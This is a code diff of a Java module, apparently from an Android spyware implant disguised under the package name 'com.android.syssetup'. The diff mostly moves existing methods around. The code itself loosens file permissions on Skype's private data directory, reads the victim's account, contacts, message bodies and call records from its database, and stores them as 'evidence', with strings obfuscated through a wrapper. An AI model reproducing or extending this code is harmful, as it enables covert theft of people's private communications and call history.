@@ -1,5 +1,22 @@
 package com.android.syssetup.module.chat;
 
+import android.database.Cursor;
+
+import com.android.mm.M;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.db.GenericSqliteHelper;
+import com.android.syssetup.db.RecordVisitor;
+import com.android.syssetup.file.Path;
+import com.android.syssetup.manager.ManagerModule;
+import com.android.syssetup.module.ModuleAddressBook;
+import com.android.syssetup.module.call.CallInfo;
+import com.android.syssetup.util.Check;
+import com.android.syssetup.util.StringUtils;
+
+import org.w3c.dom.Document;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
+
 import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
@@ -10,37 +27,109 @@ import java.util.concurrent.Semaphore;
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
 
-import org.w3c.dom.Document;
-import org.w3c.dom.Node;
-import org.w3c.dom.NodeList;
-
-import android.database.Cursor;
-
-
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.db.GenericSqliteHelper;
-import com.android.syssetup.db.RecordVisitor;
-import com.android.syssetup.file.Path;
-import com.android.syssetup.manager.ManagerModule;
-import com.android.syssetup.module.ModuleAddressBook;
-import com.android.syssetup.module.call.CallInfo;
-import com.android.syssetup.util.Check;
-import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
-
 public class ChatSkype extends SubModuleChat {
 	private static final String TAG = "ChatSkype";
 
 	private static final int PROGRAM = 0x01;
+	public static String dbDir = M.e("/data/data/com.skype.raider/files");
 	String pObserving = M.e("com.skype");
-
-	private Date lastTimestamp;
-
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	ChatGroups groups = new ChatSkypeGroups();
+	private Date lastTimestamp;
 
-	public static String dbDir = M.e("/data/data/com.skype.raider/files");
+	public static GenericSqliteHelper openSkypeDBHelper(String account) {
+		// k_1=/main.db
+		Path.unprotect(dbDir, true);
+		if (account.contains(":")) {
+			String name = account.split(":")[1];
+			File fileBaseDir = new File(dbDir);
+			File[] files = fileBaseDir.listFiles();
+			for (File f : files) {
+				if (f.getName().contains(name)) {
+					account = f.getName();
+					break;
+				}
+			}
+		}
+
+		String dbFile = dbDir + "/" + account + M.e("/main.db");
+		Path.unprotect(dbDir + "/" + account, true);
+		Path.unprotect(dbFile, true);
+		Path.unprotect(dbFile + M.e("-journal"), true);
+
+		File file = new File(dbFile);
+
+		GenericSqliteHelper helper = null;
+		if (file.canRead()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readSkypeMessageHistory): can read DB");
+			}
+
+			helper = GenericSqliteHelper.openCopy(dbFile);
+		}
+
+		return helper;
+	}
+
+	public static String readAccount() {
+
+		String confFile = dbDir + M.e("/shared.xml");
+
+		Path.unprotect(confFile, true);
+
+		DocumentBuilder builder;
+		String account = null;
+		try {
+			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
+			Document doc = builder.parse(new File(confFile));
+			NodeList defaults = doc.getElementsByTagName(M.e("Default"));
+			for (int i = 0; i < defaults.getLength(); i++) {
+				Node d = defaults.item(i);
+				Node p = d.getParentNode();
+				if (M.e("Account").equals(p.getNodeName())) {
+					account = d.getFirstChild().getNodeValue();
+					break;
+				}
+			}
+
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readAccount) Error: " + e);
+			}
+		}
+		return account;
+	}
+
+	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
+		// select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1
+		String sqlQuery = M.e("select ca.id,identity,dispname,call_duration,cm.type,cm.creation_timestamp,is_incoming,ca.begin_timestamp from callmembers as cm join calls as ca on cm.call_name = ca.name order by ca.begin_timestamp desc limit 1");
+
+		RecordVisitor visitor = new RecordVisitor() {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				callInfo.id = cursor.getInt(0);
+				callInfo.peer = cursor.getString(1);
+				callInfo.displayName = cursor.getString(2);
+				int type = cursor.getInt(4);
+				callInfo.timestamp = new Date(cursor.getLong(5));
+
+				callInfo.incoming = cursor.getInt(6) == 1;
+				callInfo.valid = true;
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getCurrentCall), timestamp: " + cursor.getLong(5) + " -> " + callInfo.timestamp + "begin: " + cursor.getInt(7));
+				}
+
+				return callInfo.id;
+			}
+		};
+
+		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
+
+		return callInfo.valid;
+	}
 
 	@Override
 	public int getProgramId() {
@@ -118,7 +207,7 @@ public class ChatSkype extends SubModuleChat {
 				}
 				return;
 			}
-			try{
+			try {
 
 				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.SKYPE, account);
 				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
@@ -160,42 +249,8 @@ public class ChatSkype extends SubModuleChat {
 		}
 	}
 
-	public static GenericSqliteHelper openSkypeDBHelper(String account) {
-		// k_1=/main.db
-		Path.unprotect(dbDir,true);
-		if(account.contains(":")){
-			String name = account.split(":")[1];
-			File fileBaseDir = new File(dbDir);
-			File[] files = fileBaseDir.listFiles();
-			for ( File f : files) {
-				if(f.getName().contains(name)){
-					account = f.getName();
-					break;
-				}
-			}
-		}
-
-		String dbFile = dbDir + "/" + account + M.e("/main.db");
-		Path.unprotect(dbDir + "/" + account, true);
-		Path.unprotect(dbFile, true);
-		Path.unprotect(dbFile + M.e("-journal"), true);
-
-		File file = new File(dbFile);
-
-		GenericSqliteHelper helper = null;
-		if (file.canRead()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readSkypeMessageHistory): can read DB");
-			}
-
-			helper = GenericSqliteHelper.openCopy(dbFile);
-		}
-
-		return helper;
-	}
-
 	private void saveSkypeContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[] { M.e("id"), M.e("skypename"), M.e("fullname"), M.e("displayname"), M.e("pstnnumber") };
+		String[] projection = new String[]{M.e("id"), M.e("skypename"), M.e("fullname"), M.e("displayname"), M.e("pstnnumber")};
 
 		boolean tosave = false;
 		RecordVisitor visitor = new RecordVisitor(projection, M.e("is_permanent=1")) {
@@ -234,7 +289,7 @@ public class ChatSkype extends SubModuleChat {
 
 		final List<SkypeConversation> conversations = new ArrayList<SkypeConversation>();
 
-		String[] projection = new String[] { M.e("id"), M.e("identity"), M.e("displayname"), M.e("given_displayname"), M.e("inbox_message_id"), M.e("inbox_timestamp") };
+		String[] projection = new String[]{M.e("id"), M.e("identity"), M.e("displayname"), M.e("given_displayname"), M.e("inbox_message_id"), M.e("inbox_timestamp")};
 		String selection = M.e("inbox_timestamp > 0 and is_permanent=1");
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
@@ -267,7 +322,7 @@ public class ChatSkype extends SubModuleChat {
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			String[] projection = new String[] { M.e("id"), M.e("author"), M.e("body_xml"), M.e("timestamp") };
+			String[] projection = new String[]{M.e("id"), M.e("author"), M.e("body_xml"), M.e("timestamp")};
 			String selection = M.e("type == 61 and convo_id = ") + conversation.id + M.e(" and body_xml != '' and timestamp > ")
 					+ lastTimestamp;
 			String order = M.e("timestamp");
@@ -342,7 +397,7 @@ public class ChatSkype extends SubModuleChat {
 
 	private void fetchGroup(GenericSqliteHelper helper, final String conversation) {
 
-		String[] projection = new String[] { M.e("identity") };
+		String[] projection = new String[]{M.e("identity")};
 		String selection = M.e("chatname = '") + conversation + "'";
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
@@ -357,69 +412,8 @@ public class ChatSkype extends SubModuleChat {
 		helper.traverseRecords(M.e("ChatMembers"), visitor);
 	}
 
-	public static String readAccount() {
-
-		String confFile = dbDir + M.e("/shared.xml");
-
-		Path.unprotect(confFile, true);
-
-		DocumentBuilder builder;
-		String account = null;
-		try {
-			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
-			Document doc = builder.parse(new File(confFile));
-			NodeList defaults = doc.getElementsByTagName(M.e("Default"));
-			for (int i = 0; i < defaults.getLength(); i++) {
-				Node d = defaults.item(i);
-				Node p = d.getParentNode();
-				if (M.e("Account").equals(p.getNodeName())) {
-					account = d.getFirstChild().getNodeValue();
-					break;
-				}
-			}
-
-		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readAccount) Error: " + e);
-			}
-		}
-		return account;
-	}
-
-
-
 	public void saveEvidence(ArrayList<MessageChat> messages) {
 		getModule().saveEvidence(messages);
-	}
-
-	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
-		// select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1
-		String sqlQuery= M.e("select ca.id,identity,dispname,call_duration,cm.type,cm.creation_timestamp,is_incoming,ca.begin_timestamp from callmembers as cm join calls as ca on cm.call_name = ca.name order by ca.begin_timestamp desc limit 1");
-
-		RecordVisitor visitor = new RecordVisitor() {
-
-			@Override
-			public long cursor(Cursor cursor) {
-				callInfo.id = cursor.getInt(0);
-				callInfo.peer = cursor.getString(1);
-				callInfo.displayName = cursor.getString(2);
-				int type = cursor.getInt(4);
-				callInfo.timestamp = new Date(cursor.getLong(5));
-
-				callInfo.incoming = cursor.getInt(6) == 1;
-				callInfo.valid = true;
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getCurrentCall), timestamp: " + cursor.getLong(5) + " -> "+ callInfo.timestamp + "begin: " + cursor.getInt(7));
-				}
-
-				return callInfo.id;
-			}
-		};
-
-		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
-
-		return callInfo.valid;
 	}
 
 	public class ChatSkypeGroups extends ChatGroups {
